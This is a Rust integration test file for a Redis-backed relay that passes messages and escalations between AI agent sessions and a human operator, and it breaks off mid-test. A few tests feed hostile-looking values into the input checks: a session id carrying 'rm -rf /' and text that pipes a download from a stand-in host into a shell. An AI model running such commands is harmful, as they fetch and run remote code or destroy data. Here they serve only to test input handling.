//! Store behaviour against a real Redis.
//!
//! Needs `IX_RELAY_TEST_URL` (`make test-redis` starts a throwaway container and
//! sets it). Without it each test returns early and says so on stderr.
#![expect(
    clippy::unwrap_used,
    clippy::expect_used,
    reason = "test code: a failed unwrap/expect is the failure signal"
)]

use std::{collections::HashSet, num::NonZeroUsize, thread, time::Duration};

use relay_core::{
    AgentName, Claim, Error, Escalation, EscalationFiling, EscalationStatus, HookHealthEntry,
    IdentityCommit, Message, PaneRef, PlaceRefresh, Popper, Registration, Relay, Target,
};

fn relay(test: &str) -> Option<Relay> {
    let Ok(url) = std::env::var("IX_RELAY_TEST_URL") else {
        eprintln!("skipping {test}: IX_RELAY_TEST_URL unset (run `make test-redis`)");
        return None;
    };
    let relay = Relay::connect(&url, Duration::from_secs(2)).expect("connect to test redis");
    Some(relay.with_prefix(format!("test:{}:{test}:", std::process::id())))
}

/// A hook's claim: what these pops are for; nothing here waits for a lease.
fn hook() -> Claim {
    Claim::new(Popper::Hook)
}

fn name(s: &str) -> AgentName {
    s.parse().unwrap()
}

fn register(relay: &mut Relay, n: &str) {
    relay
        .register(&Registration {
            name: name(n),
            machine: "node-a".parse().unwrap(),
            kind: "claude".into(),
            session_id: Some(format!("sid-{n}").parse().unwrap()),
            cwd: Some("/work".into()),
            herdr_pane: Some(format!("w1:p-{n}").parse().unwrap()),
            place: None,
            last_seen_ms: 1,
        })
        .unwrap();
}

fn eid(s: &str) -> relay_core::EscalationId {
    s.parse().unwrap()
}

fn msg(from: &str, to: &str, text: &str, at: i64) -> Message {
    Message {
        from: name(from),
        to: to.parse().unwrap(),
        text: text.into(),
        sent_at_ms: at,
    }
}

const MAX: NonZeroUsize = NonZeroUsize::new(50).unwrap();

#[test]
fn a_sent_message_is_popped_exactly_once_in_order() {
    let Some(mut r) = relay("once") else { return };
    register(&mut r, "tl-lead");
    for text in ["one", "two"] {
        assert_eq!(
            r.send(&msg("qsl-lead", "tl-lead", text, 1)).unwrap(),
            vec![name("tl-lead")]
        );
    }
    let got = r.pop_inbox(&name("tl-lead"), MAX).unwrap();
    assert!(got.rejected.is_empty());
    assert_eq!(
        got.messages
            .iter()
            .map(|m| m.text.as_str())
            .collect::<Vec<_>>(),
        ["one", "two"]
    );
    assert!(
        r.pop_inbox(&name("tl-lead"), MAX)
            .unwrap()
            .messages
            .is_empty()
    );
}

#[test]
fn pop_takes_at_most_max_and_leaves_the_rest() {
    let Some(mut r) = relay("max") else { return };
    register(&mut r, "tl-lead");
    for i in 0..3 {
        r.send(&msg("qsl-lead", "tl-lead", &i.to_string(), 1))
            .unwrap();
    }
    let two = NonZeroUsize::new(2).unwrap();
    assert_eq!(
        r.pop_inbox(&name("tl-lead"), two).unwrap().messages.len(),
        2
    );
    assert_eq!(
        r.pop_inbox(&name("tl-lead"), two).unwrap().messages[0].text,
        "2"
    );
}

#[test]
fn concurrent_consumers_never_deliver_a_message_twice() {
    let Some(mut r) = relay("race") else { return };
    register(&mut r, "tl-lead");
    for i in 0..200 {
        r.send(&msg("qsl-lead", "tl-lead", &i.to_string(), 1))
            .unwrap();
    }
    let prefix = format!("test:{}:race:", std::process::id());
    let url = std::env::var("IX_RELAY_TEST_URL").unwrap();
    let consumers = (0..4).map(|_| {
        let (url, prefix) = (url.clone(), prefix.clone());
        thread::spawn(move || {
            let mut r = Relay::connect(&url, Duration::from_secs(2))
                .unwrap()
                .with_prefix(prefix);
            let mut seen = Vec::new();
            loop {
                let batch = r
                    .pop_inbox(&name("tl-lead"), NonZeroUsize::new(7).unwrap())
                    .unwrap();
                if batch.messages.is_empty() {
                    return seen;
                }
                seen.extend(batch.messages.into_iter().map(|m| m.text));
            }
        })
    });
    let all: Vec<String> = consumers.flat_map(|h| h.join().unwrap()).collect();
    let unique: HashSet<&String> = all.iter().collect();
    assert_eq!(all.len(), 200, "every message delivered");
    assert_eq!(unique.len(), 200, "no message delivered twice");
}

#[test]
fn broadcast_reaches_everyone_but_the_sender() {
    let Some(mut r) = relay("all") else { return };
    for n in ["qsl-lead", "tl-lead", "ir-lead"] {
        register(&mut r, n);
    }
    let to = r.send(&msg("qsl-lead", "all", "hi", 1)).unwrap();
    assert_eq!(to, vec![name("ir-lead"), name("tl-lead")]);
    assert!(
        r.pop_inbox(&name("qsl-lead"), MAX)
            .unwrap()
            .messages
            .is_empty()
    );
    let got = r.pop_inbox(&name("ir-lead"), MAX).unwrap();
    assert_eq!(got.messages, vec![msg("qsl-lead", "all", "hi", 1)]);
    assert_eq!(got.messages[0].to, Target::All);
}

#[test]
fn sending_to_an_unregistered_lead_is_refused_and_queues_nothing() {
    let Some(mut r) = relay("unknown") else {
        return;
    };
    let err = r.send(&msg("qsl-lead", "tl-laed", "typo", 1)).unwrap_err();
    assert!(matches!(err, Error::UnknownAgent(n) if n == name("tl-laed")));
    assert!(r.log(0, 10).unwrap().is_empty());
}

#[test]
fn log_keeps_history_after_delivery_and_filters_by_time() {
    let Some(mut r) = relay("log") else { return };
    register(&mut r, "tl-lead");
    r.send(&msg("qsl-lead", "tl-lead", "kept", 1)).unwrap();
    r.pop_inbox(&name("tl-lead"), MAX).unwrap();
    let log = r.log(0, 10).unwrap();
    assert_eq!(log, vec![msg("qsl-lead", "tl-lead", "kept", 1)]);
    assert!(
        r.log(i64::MAX / 2, 10).unwrap().is_empty(),
        "nothing logged in the far future"
    );
}

#[test]
fn log_returns_the_most_recent_max_entries_oldest_first() {
    let Some(mut r) = relay("logmax") else { return };
    register(&mut r, "tl-lead");
    for i in 0..5 {
        r.send(&msg("qsl-lead", "tl-lead", &i.to_string(), 1))
            .unwrap();
    }
    // 5 entries logged, only 3 asked for: must be the newest 3, not the oldest.
    let log = r.log(0, 3).unwrap();
    assert_eq!(
        log.iter().map(|m| m.text.as_str()).collect::<Vec<_>>(),
        ["2", "3", "4"]
    );
}

#[test]
fn log_since_returns_all_retained_messages_oldest_first() {
    let Some(mut r) = relay("log-since") else {
        return;
    };
    register(&mut r, "tl-lead");
    r.send(&msg("qsl-lead", "tl-lead", "first", 1)).unwrap();
    let first_entry_id = r.log_tail_id().unwrap();
    let (first_entry_ms, _) = first_entry_id.split_once('-').unwrap();
    let since_ms = first_entry_ms.parse().unwrap();
    for text in ["second", "third"] {
        r.send(&msg("qsl-lead", "tl-lead", text, 1)).unwrap();
    }

    assert_eq!(
        r.log_since(since_ms)
            .unwrap()
            .iter()
            .map(|message| message.text.as_str())
            .collect::<Vec<_>>(),
        ["first", "second", "third"],
        "the actual first stream entry at the inclusive bound is retained"
    );
    assert!(r.log_since(i64::MAX).unwrap().is_empty());
}

#[test]
fn pop_inbox_returns_good_messages_and_reports_bad_ones() {
    let Some(mut r) = relay("badentry") else {
        return;
    };
    register(&mut r, "tl-lead");
    r.send(&msg("qsl-lead", "tl-lead", "good", 1)).unwrap();

    // Reach around the Relay API to write a hand-corrupted entry straight into
    // the inbox list, the way `pop_inbox`'s doc comment describes: "someone
    // wrote to the inbox key by hand".
    let url = std::env::var("IX_RELAY_TEST_URL").unwrap();
    let prefix = format!("test:{}:badentry:", std::process::id());
    let mut raw = redis::Client::open(url).unwrap().get_connection().unwrap();
    let _: () =
        redis::Commands::rpush(&mut raw, format!("{prefix}inbox:tl-lead"), "not json").unwrap();

    r.send(&msg("qsl-lead", "tl-lead", "also-good", 2)).unwrap();

    let popped = r.pop_inbox(&name("tl-lead"), MAX).unwrap();
    assert_eq!(
        popped
            .messages
            .iter()
            .map(|m| m.text.as_str())
            .collect::<Vec<_>>(),
        ["good", "also-good"],
        "the one bad entry did not lose the good ones around it"
    );
    assert_eq!(popped.rejected.len(), 1);
    assert!(matches!(&popped.rejected[0], Error::Decode { .. }));
}

#[test]
fn requeue_front_restores_order_ahead_of_anything_already_queued() {
    let Some(mut r) = relay("requeue") else {
        return;
    };
    register(&mut r, "tl-lead");
    for text in ["one", "two", "three"] {
        r.send(&msg("qsl-lead", "tl-lead", text, 1)).unwrap();
    }
    let two = NonZeroUsize::new(2).unwrap();
    let popped = r.pop_inbox(&name("tl-lead"), two).unwrap();
    assert_eq!(
        popped
            .messages
            .iter()
            .map(|m| m.text.as_str())
            .collect::<Vec<_>>(),
        ["one", "two"]
    );

    // Something else arrives while we're deciding to requeue.
    r.send(&msg("qsl-lead", "tl-lead", "arrived-while-requeuing", 2))
        .unwrap();

    r.requeue_front(&name("tl-lead"), &popped.messages).unwrap();

    let rest = r.pop_inbox(&name("tl-lead"), MAX).unwrap();
    assert_eq!(
        rest.messages
            .iter()
            .map(|m| m.text.as_str())
            .collect::<Vec<_>>(),
        ["one", "two", "three", "arrived-while-requeuing"],
        "requeued messages come back in their original order, ahead of anything newer"
    );
}

#[test]
fn requeue_front_of_an_empty_batch_is_a_no_op() {
    let Some(mut r) = relay("requeue-empty") else {
        return;
    };
    register(&mut r, "tl-lead");
    r.requeue_front(&name("tl-lead"), &[]).unwrap();
    assert_eq!(r.inbox_len(&name("tl-lead")).unwrap(), 0);
}

#[test]
fn inbox_len_counts_without_popping() {
    let Some(mut r) = relay("inboxlen") else {
        return;
    };
    register(&mut r, "tl-lead");
    assert_eq!(r.inbox_len(&name("tl-lead")).unwrap(), 0);
    for i in 0..3 {
        r.send(&msg("qsl-lead", "tl-lead", &i.to_string(), 1))
            .unwrap();
    }
    assert_eq!(r.inbox_len(&name("tl-lead")).unwrap(), 3);
    // Checking the count twice does not consume anything.
    assert_eq!(r.inbox_len(&name("tl-lead")).unwrap(), 3);
    let popped = r.pop_inbox(&name("tl-lead"), MAX).unwrap();
    assert_eq!(popped.messages.len(), 3);
    assert_eq!(r.inbox_len(&name("tl-lead")).unwrap(), 0);
}

#[test]
fn budgeted_pop_splits_a_batch_leaves_the_rest_queued_in_order_and_reports_pending() {
    let Some(mut r) = relay("budget") else { return };
    register(&mut r, "tl-lead");
    r.send(&msg("qsl-lead", "tl-lead", "short-one", 1)).unwrap();
    // Big enough that, once "short-one" is already in the running total, adding
    // this one blows a 200-byte budget — so the budget must stop before it.
    let big_text = "x".repeat(2_000);
    r.send(&msg("qsl-lead", "tl-lead", &big_text, 2)).unwrap();
    r.send(&msg("qsl-lead", "tl-lead", "short-two", 3)).unwrap();

    let big = NonZeroUsize::new(10).unwrap();
    let first = r
        .pop_inbox_budget(&name("tl-lead"), big, 200, hook())
        .unwrap();
    assert!(first.rejected.is_empty());
    assert_eq!(
        first
            .messages
            .iter()
            .map(|m| m.text.as_str())
            .collect::<Vec<_>>(),
        ["short-one"],
        "the big message must not fit alongside short-one under a 200-byte budget"
    );
    assert_eq!(
        first.pending, 2,
        "the big message and short-two are still queued"
    );

    // The rest is still there, in order, for the next call.
    let second = r
        .pop_inbox_budget(&name("tl-lead"), big, 1_000_000, hook())
        .unwrap();
    assert_eq!(
        second
            .messages
            .iter()
            .map(|m| m.text.as_str())
            .collect::<Vec<_>>(),
        [big_text.as_str(), "short-two"]
    );
    assert_eq!(second.pending, 0);
}

#[test]
fn budgeted_pop_always_takes_at_least_one_even_over_budget() {
    let Some(mut r) = relay("budget-min-one") else {
        return;
    };
    register(&mut r, "tl-lead");
    let big_text = "x".repeat(2_000);
    r.send(&msg("qsl-lead", "tl-lead", &big_text, 1)).unwrap();
    r.send(&msg("qsl-lead", "tl-lead", "second", 2)).unwrap();

    // A 1-byte budget can't fit anything, but the first message is still taken.
    let one = NonZeroUsize::new(10).unwrap();
    let popped = r
        .pop_inbox_budget(&name("tl-lead"), one, 1, hook())
        .unwrap();
    assert_eq!(
        popped
            .messages
            .iter()
            .map(|m| m.text.as_str())
            .collect::<Vec<_>>(),
        [big_text.as_str()]
    );
    assert_eq!(popped.pending, 1, "second message still queued behind it");
}

#[test]
fn budgeted_pop_never_exceeds_max_count() {
    let Some(mut r) = relay("budget-max-count") else {
        return;
    };
    register(&mut r, "tl-lead");
    for i in 0..5 {
        r.send(&msg("qsl-lead", "tl-lead", &i.to_string(), 1))
            .unwrap();
    }
    let two = NonZeroUsize::new(2).unwrap();
    // A huge byte budget alone must not pull more than max_count.
    let popped = r
        .pop_inbox_budget(&name("tl-lead"), two, 1_000_000, hook())
        .unwrap();
    assert_eq!(popped.messages.len(), 2);
    assert_eq!(popped.pending, 3);
}

#[test]
fn send_refuses_text_over_the_byte_cap() {
    let Some(mut r) = relay("toolarge") else {
        return;
    };
    register(&mut r, "tl-lead");
    let oversized = "x".repeat(relay_core::MAX_MESSAGE_BYTES + 1);
    let err = r
        .send(&msg("qsl-lead", "tl-lead", &oversized, 1))
        .unwrap_err();
    assert!(
        matches!(&err, Error::MessageTooLarge { len, max }
            if *len == oversized.len() && *max == relay_core::MAX_MESSAGE_BYTES),
        "unexpected error: {err}"
    );
    // Refused before anything was queued.
    assert!(
        r.pop_inbox(&name("tl-lead"), MAX)
            .unwrap()
            .messages
            .is_empty()
    );
}

#[test]
fn registering_twice_replaces_the_entry() {
    let Some(mut r) = relay("who") else { return };
    register(&mut r, "tl-lead");
    register(&mut r, "qsl-lead");
    let mut again = r.agents().unwrap().registrations.remove(1);
    again.session_id = Some("new".parse().unwrap());
    r.register(&again).unwrap();
    let who = r.agents().unwrap().registrations;
    assert_eq!(
        who.iter().map(|a| a.name.as_str()).collect::<Vec<_>>(),
        ["qsl-lead", "tl-lead"]
    );
    assert_eq!(who[1].session_id.as_ref().map(|v| v.as_str()), Some("new"));
}

#[test]
fn agent_looks_up_one_registration_by_name_or_none() {
    let Some(mut r) = relay("agent-lookup") else {
        return;
    };
    assert_eq!(r.agent(&name("tl-lead")).unwrap(), None);
    register(&mut r, "tl-lead");
    let found = r.agent(&name("tl-lead")).unwrap().expect("registered");
    assert_eq!(found.name, name("tl-lead"));
    assert_eq!(found.machine.as_str(), "node-a");
}

// ---- aliases (AGE-2018) -----------------------------------------------

#[test]
fn session_name_round_trips_through_commit_identity() {
    let Some(mut r) = relay("session-name") else {
        return;
    };
    assert_eq!(
        r.probe_session(&"sid-1".parse().unwrap()).unwrap().name,
        None
    );
    remember_session(&mut r, "sid-1", "qsl-lead");
    assert_eq!(
        r.probe_session(&"sid-1".parse().unwrap()).unwrap().name,
        Some(name("qsl-lead"))
    );
    // A different, never-remembered session id is still unknown.
    assert_eq!(
        r.probe_session(&"sid-2".parse().unwrap()).unwrap().name,
        None
    );
}

#[test]
fn remembering_a_session_again_overwrites_the_previous_name() {
    let Some(mut r) = relay("session-name-overwrite") else {
        return;
    };
    remember_session(&mut r, "sid-1", "qsl-lead");
    remember_session(&mut r, "sid-1", "qsl-t2");
    assert_eq!(
        r.probe_session(&"sid-1".parse().unwrap()).unwrap().name,
        Some(name("qsl-t2"))
    );
}

// ---- escalations -----------------------------------------------------

fn new_escalation(ticket: &str, lead: &str) -> EscalationFiling {
    EscalationFiling {
        ticket: ticket.parse().unwrap(),
        lead: name(lead),
        machine: "node-a".parse().unwrap(),
        session_id: "sid-1".parse().unwrap(),
        cwd: Some("/work".into()),
        kind: "claude".into(),
        context: "which redis eviction policy?".into(),
        options: vec!["noeviction".into(), "allkeys-lru".into()],
        recommendation: "noeviction".into(),
        created_at_ms: 1,
    }
}

#[test]
fn escalate_stores_a_waiting_escalation_get_reads_it_back() {
    let Some(mut r) = relay("escalate-get") else {
        return;
    };
    let esc = r.escalate(new_escalation("AGE-2014", "qsl-lead")).unwrap();
    assert!(esc.id.as_str().starts_with('e'));
    assert_eq!(esc.status, EscalationStatus::Waiting);
    assert_eq!(esc.decision, None);
    assert_eq!(esc.filing.ticket.as_str(), "AGE-2014");
    assert_eq!(esc.filing.lead, name("qsl-lead"));
    assert_eq!(esc.filing.options, vec!["noeviction", "allkeys-lru"]);

    let fetched = r.get(&esc.id).unwrap();
    assert_eq!(fetched, esc);
}

#[test]
fn escalate_ids_increment_and_never_collide_within_one_prefix() {
    let Some(mut r) = relay("escalate-ids") else {
        return;
    };
    let a = r.escalate(new_escalation("AGE-1", "qsl-lead")).unwrap();
    let b = r.escalate(new_escalation("AGE-2", "qsl-lead")).unwrap();
    assert_ne!(a.id, b.id);
}

#[test]
fn get_unknown_id_is_not_found() {
    let Some(mut r) = relay("get-missing") else {
        return;
    };
    let err = r.get(&eid("e999")).unwrap_err();
    assert!(
        matches!(&err, Error::EscalationNotFound(id) if id == "e999"),
        "{err}"
    );
}

#[test]
fn list_filters_by_status_and_is_oldest_first() {
    let Some(mut r) = relay("list-status") else {
        return;
    };
    let mut a = new_escalation("AGE-1", "qsl-lead");
    a.created_at_ms = 1;
    let mut b = new_escalation("AGE-2", "qsl-lead");
    b.created_at_ms = 2;
    let a = r.escalate(a).unwrap();
    let b = r.escalate(b).unwrap();
    r.set_investigating(&b.id).unwrap();

    let all = r.list(None).unwrap();
    assert!(all.rejected.is_empty());
    assert_eq!(
        all.escalations
            .iter()
            .map(|e| e.id.clone())
            .collect::<Vec<_>>(),
        [a.id.clone(), b.id.clone()]
    );

    let waiting = r.list(Some(EscalationStatus::Waiting)).unwrap();
    assert_eq!(
        waiting
            .escalations
            .iter()
            .map(|e| e.id.clone())
            .collect::<Vec<_>>(),
        vec![a.id.clone()]
    );

    let investigating = r.list(Some(EscalationStatus::Investigating)).unwrap();
    assert_eq!(
        investigating
            .escalations
            .iter()
            .map(|e| e.id.clone())
            .collect::<Vec<_>>(),
        vec![b.id.clone()]
    );

    assert!(
        r.list(Some(EscalationStatus::Resolved))
            .unwrap()
            .escalations
            .is_empty()
    );
}

#[test]
fn list_reports_a_corrupt_hash_without_losing_the_rest() {
    let Ok(url) = std::env::var("IX_RELAY_TEST_URL") else {
        eprintln!(
            "skipping list_reports_a_corrupt_hash_without_losing_the_rest: IX_RELAY_TEST_URL unset"
        );
        return;
    };
    let prefix = format!("test:{}:list-corrupt:", std::process::id());
    let mut r = Relay::connect(&url, Duration::from_secs(2))
        .unwrap()
        .with_prefix(prefix.clone());
    let good = r.escalate(new_escalation("AGE-1", "qsl-lead")).unwrap();

    // Simulate a hand-edited/corrupt hash directly against Redis (bypassing
    // `Relay`'s own API, which never writes a hash missing `meta`): present
    // in the index, but its hash has no `meta` field at all.
    let mut raw = redis::Client::open(url).unwrap().get_connection().unwrap();
    let _: () = redis::cmd("HSET")
        .arg(format!("{prefix}esc:bogus"))
        .arg("status")
        .arg("waiting")
        .query(&mut raw)
        .unwrap();
    let _: () = redis::cmd("ZADD")
        .arg(format!("{prefix}esc:index"))
        .arg(1)
        .arg("bogus")
        .query(&mut raw)
        .unwrap();

    let listed = r.list(None).unwrap();
    assert_eq!(
        listed
            .escalations
            .iter()
            .map(|e| e.id.clone())
            .collect::<Vec<_>>(),
        vec![good.id]
    );
    assert_eq!(listed.rejected.len(), 1);
    assert_eq!(listed.rejected[0].0, "bogus");
}

#[test]
fn set_investigating_is_allowed_from_waiting_and_again_from_investigating() {
    let Some(mut r) = relay("investigate-twice") else {
        return;
    };
    let esc = r.escalate(new_escalation("AGE-1", "qsl-lead")).unwrap();
    let once = r.set_investigating(&esc.id).unwrap();
    assert_eq!(once.status, EscalationStatus::Investigating);
    // A second investigation (the operator opening another look) is fine.
    let twice = r.set_investigating(&esc.id).unwrap();
    assert_eq!(twice.status, EscalationStatus::Investigating);
}

#[test]
fn set_investigating_unknown_id_is_not_found() {
    let Some(mut r) = relay("investigate-missing") else {
        return;
    };
    let err = r.set_investigating(&eid("e999")).unwrap_err();
    assert!(
        matches!(&err, Error::EscalationNotFound(id) if id == "e999"),
        "{err}"
    );
}

#[test]
fn resolve_sets_decision_and_status_from_waiting() {
    let Some(mut r) = relay("resolve-waiting") else {
        return;
    };
    let esc = r.escalate(new_escalation("AGE-1", "qsl-lead")).unwrap();
    let resolved = r.resolve(&esc.id, "go with noeviction").unwrap();
    assert_eq!(resolved.status, EscalationStatus::Resolved);
    assert_eq!(resolved.decision.as_deref(), Some("go with noeviction"));

    let fetched = r.get(&esc.id).unwrap();
    assert_eq!(fetched, resolved);
}

#[test]
fn resolve_from_investigating_also_works() {
    let Some(mut r) = relay("resolve-investigating") else {
        return;
    };
    let esc = r.escalate(new_escalation("AGE-1", "qsl-lead")).unwrap();
    r.set_investigating(&esc.id).unwrap();
    let resolved = r.resolve(&esc.id, "decision").unwrap();
    assert_eq!(resolved.status, EscalationStatus::Resolved);
}

#[test]
fn resolving_an_already_resolved_escalation_is_refused() {
    let Some(mut r) = relay("double-resolve") else {
        return;
    };
    let esc = r.escalate(new_escalation("AGE-1", "qsl-lead")).unwrap();
    r.resolve(&esc.id, "first decision").unwrap();
    let err = r.resolve(&esc.id, "second decision").unwrap_err();
    assert!(
        matches!(&err, Error::EscalationAlreadyResolved(id) if id == esc.id.as_str()),
        "{err}"
    );
    // The first decision is untouched.
    assert_eq!(
        r.get(&esc.id).unwrap().decision.as_deref(),
        Some("first decision")
    );
}

#[test]
fn investigating_an_already_resolved_escalation_is_refused() {
    let Some(mut r) = relay("investigate-after-resolve") else {
        return;
    };
    let esc = r.escalate(new_escalation("AGE-1", "qsl-lead")).unwrap();
    r.resolve(&esc.id, "decision").unwrap();
    let err = r.set_investigating(&esc.id).unwrap_err();
    assert!(
        matches!(&err, Error::EscalationAlreadyResolved(id) if id == esc.id.as_str()),
        "{err}"
    );
}

#[test]
fn resolve_unknown_id_is_not_found() {
    let Some(mut r) = relay("resolve-missing") else {
        return;
    };
    let err = r.resolve(&eid("e999"), "decision").unwrap_err();
    assert!(
        matches!(&err, Error::EscalationNotFound(id) if id == "e999"),
        "{err}"
    );
}

/// Two concurrent `resolve` calls on the same escalation: the transition runs
/// as one Redis Lua script, so exactly one of them observes `Waiting` and
/// wins; the other observes the already-`resolved` status the winner just
/// wrote and gets [`Error::EscalationAlreadyResolved`]. Guards against a
/// non-atomic get-then-set implementation, where both could read `Waiting`
/// before either writes and both would appear to succeed.
#[test]
fn two_concurrent_resolves_exactly_one_wins() {
    let Ok(url) = std::env::var("IX_RELAY_TEST_URL") else {
        eprintln!("skipping two_concurrent_resolves_exactly_one_wins: IX_RELAY_TEST_URL unset");
        return;
    };
    let prefix = format!("test:{}:concurrent-resolve:", std::process::id());
    let mut setup = Relay::connect(&url, Duration::from_secs(2))
        .unwrap()
        .with_prefix(prefix.clone());
    let esc = setup.escalate(new_escalation("AGE-1", "qsl-lead")).unwrap();

    let barrier = std::sync::Arc::new(std::sync::Barrier::new(2));
    let handles: Vec<_> = ["decision A", "decision B"]
        .into_iter()
        .map(|decision| {
            let url = url.clone();
            let prefix = prefix.clone();
            let id = esc.id.clone();
            let barrier = std::sync::Arc::clone(&barrier);
            thread::spawn(move || {
                let mut r = Relay::connect(&url, Duration::from_secs(2))
                    .unwrap()
                    .with_prefix(prefix);
                barrier.wait();
                r.resolve(&id, decision)
            })
        })
        .collect();

    let results: Vec<_> = handles.into_iter().map(|h| h.join().unwrap()).collect();
    let oks: Vec<&Escalation> = results.iter().filter_map(|r| r.as_ref().ok()).collect();
    let errs: Vec<_> = results.iter().filter_map(|r| r.as_ref().err()).collect();
    assert_eq!(oks.len(), 1, "exactly one resolve should win: {results:?}");
    assert_eq!(errs.len(), 1, "the other should be refused: {results:?}");
    assert!(
        matches!(errs[0], Error::EscalationAlreadyResolved(id) if id == esc.id.as_str()),
        "{:?}",
        errs[0]
    );

    let stored = setup.get(&esc.id).unwrap();
    assert_eq!(stored.status, EscalationStatus::Resolved);
    assert!(
        stored.decision.as_deref() == Some("decision A")
            || stored.decision.as_deref() == Some("decision B")
    );
}

#[test]
fn escalate_refuses_an_invalid_session_id_and_stores_nothing() {
    let Some(mut r) = relay("escalate-bad-session") else {
        return;
    };
    let mut bad = new_escalation("AGE-1", "qsl-lead");
    bad.session_id = "sid; rm -rf /".parse().unwrap();
    let err = r.escalate(bad).unwrap_err();
    assert!(matches!(&err, Error::InvalidSessionId { .. }), "{err}");
    // Nothing was stored: the seq counter wasn't even touched, so the next
    // successful escalate still gets id e1.
    let esc = r.escalate(new_escalation("AGE-2", "qsl-lead")).unwrap();
    assert_eq!(esc.id, "e1");
}

/// Text carrying a control byte (a raw ETX/ctrl-C, or a bracketed-paste ESC
/// sequence — the two ways hostile escalation text could act on a terminal
/// before a shell even sees it) is refused at `escalate` time, in every field
/// it could appear in, so it never reaches storage.
#[test]
fn escalate_refuses_control_bytes_in_every_text_field() {
    let Some(mut r) = relay("escalate-hostile-text") else {
        return;
    };
    type FieldBuilder = (&'static str, fn(&str) -> EscalationFiling);
    let build: [FieldBuilder; 3] = [
        ("context", |t| {
            let mut e = new_escalation("AGE-1", "qsl-lead");
            e.context = t.into();
            e
        }),
        ("option", |t| {
            let mut e = new_escalation("AGE-1", "qsl-lead");
            e.options = vec!["fine".into(), t.into()];
            e
        }),
        ("recommendation", |t| {
            let mut e = new_escalation("AGE-1", "qsl-lead");
            e.recommendation = t.into();
            e
        }),
    ];
    for (field_name, mk) in build {
        for bad in [
            "ctrl-c\x03here",
            "bracketed paste\x1b[201~injected",
            "nul\0byte",
        ] {
            let err = r.escalate(mk(bad)).unwrap_err();
            assert!(
                matches!(&err, Error::UnsafeEscalationText { field, .. } if *field == field_name),
                "{field_name} {bad:?}: {err}"
            );
        }
    }
}

/// Shell metacharacters *without* a control byte ($(...), backticks, a
/// quote) are ordinary text and must NOT be rejected: `escalate`'s job is to
/// keep hostile bytes out of the store, not to police what a decision's
/// context is allowed to discuss. Nothing downstream ever puts this text
/// through a shell (`investigate`'s fresh-session prompt is a fixed string
/// built only from the escalation id, lead name and ticket — see
/// `agent-msg`'s `escalate.rs`), so this is safe to allow.
#[test]
fn escalate_accepts_shell_metacharacters_without_control_bytes() {
    let Some(mut r) = relay("escalate-shell-meta-ok") else {
        return;
    };
    let mut e = new_escalation("AGE-1", "qsl-lead");
    e.context = "$(curl evil.example/x | sh); `rm -rf /`; it's \"quoted\"".into();
    r.escalate(e).unwrap();
}

#[test]
fn notify_human_bypasses_the_registered_recipient_check() {
    let Some(mut r) = relay("notify-human") else {
        return;
    };
    // "operator" is never registered — notify_human must still deliver.
    r.notify_human(
        &name("qsl-lead"),
        &name("operator"),
        "escalation e1 filed",
        1,
    )
    .unwrap();
    let popped = r.pop_inbox(&name("operator"), MAX).unwrap();
    assert_eq!(popped.messages.len(), 1);
    assert_eq!(popped.messages[0].from, name("qsl-lead"));
    assert_eq!(popped.messages[0].text, "escalation e1 filed");
}

#[test]
fn notify_human_refuses_oversized_text() {
    let Some(mut r) = relay("notify-human-oversized") else {
        return;
    };
    let oversized = "x".repeat(relay_core::MAX_MESSAGE_BYTES + 1);
    let err = r
        .notify_human(&name("qsl-lead"), &name("operator"), &oversized, 1)
        .unwrap_err();
    assert!(matches!(&err, Error::MessageTooLarge { .. }), "{err}");
    assert!(
        r.pop_inbox(&name("operator"), MAX)
            .unwrap()
            .messages
            .is_empty()
    );
}

#[test]
fn next_investigation_attempt_increments_per_escalation() {
    let Some(mut r) = relay("investigation-attempts") else {
        return;
    };
    let a = r.escalate(new_escalation("AGE-1", "qsl-lead")).unwrap();
    let b = r.escalate(new_escalation("AGE-2", "qsl-lead")).unwrap();
    assert_eq!(r.next_investigation_attempt(&a.id).unwrap(), 1);
    assert_eq!(r.next_investigation_attempt(&a.id).unwrap(), 2);
    // A different escalation's counter is independent.
    assert_eq!(r.next_investigation_attempt(&b.id).unwrap(), 1);
    assert_eq!(r.next_investigation_attempt(&a.id).unwrap(), 3);
}

// ---- refresh_place ------------------------------------------------------

fn place(workspace: &str, tab: &str, _tabs: u32) -> relay_core::Place {
    relay_core::Place {
        workspace: workspace.into(),
        tab: tab.into(),
        herdr_ids: None,
    }
}

#[test]
fn refresh_place_updates_only_the_place_and_reports_whether_it_changed() {
    let Some(mut r) = relay("refresh-place") else {
        return;
    };
    let mut reg = reg_at("ea-code", "sid-1", "wB:p1");
    reg.place = Some(place("EA", "2", 3));
    r.register(&reg).unwrap();

    assert!(
        r.refresh_place(&name("ea-code"), &place("EA", "code", 3), 5, true)
            .unwrap()
            != PlaceRefresh::Unchanged
    );
    let after = r.agent(&name("ea-code")).unwrap().unwrap();
    assert_eq!(after.place, Some(place("EA", "code", 3)));
    assert_eq!(
        Registration {
            place: reg.place.clone(),
            ..after
        },
        reg,
        "nothing but the place changed"
    );

    // Already current, and an unregistered name: nothing to do.
    assert!(
        r.refresh_place(&name("ea-code"), &place("EA", "code", 3), 6, true)
            .unwrap()
            == PlaceRefresh::Unchanged
    );
    assert!(
        r.refresh_place(&name("nobody"), &place("EA", "code", 3), 6, true)
            .unwrap()
            == PlaceRefresh::Unchanged
    );
}

/// Tracing: TC-047-05
/// ACs: FR-047-AC-5
#[test]
fn commit_identity_writes_registration_cache_and_suppression_together() {
    let Some(mut r) = relay("commit-all") else {
        return;
    };
    r.commit_identity(&IdentityCommit {
        registration: Some(reg_at("qsl", "sid-1", "w1:p1")),
        session_name: Some(("sid-1".parse().unwrap(), name("qsl"))),
        suppress_session: Some("sid-fork".parse().unwrap()),
    })
    .unwrap();
    assert!(r.agent(&name("qsl")).unwrap().is_some());
    assert_eq!(
        r.probe_session(&"sid-1".parse().unwrap()).unwrap().name,
        Some(name("qsl"))
    );
    assert!(
        r.probe_session(&"sid-fork".parse().unwrap())
            .unwrap()
            .suppressed
    );
    assert!(
        !r.probe_session(&"sid-1".parse().unwrap())
            .unwrap()
            .suppressed
    );
}

/// Tracing: TC-018-06
/// ACs: FR-018-AC-6
///
/// `probe_session` answers the suppressed mark, the cached name and the
/// durable queue of a session together; an unknown session answers the default.
#[test]
fn probe_session_reads_the_suppression_and_queue_together() {
    let Some(mut r) = relay("probe-session") else {
        return;
    };
    assert_eq!(
        r.probe_session(&"sid-none".parse().unwrap()).unwrap(),
        relay_core::SessionProbe::default()
    );
    r.commit_identity(&IdentityCommit {
        session_name: Some(("sid-1".parse().unwrap(), name("qsl"))),
        suppress_session: Some("sid-fork".parse().unwrap()),
        registration: None,
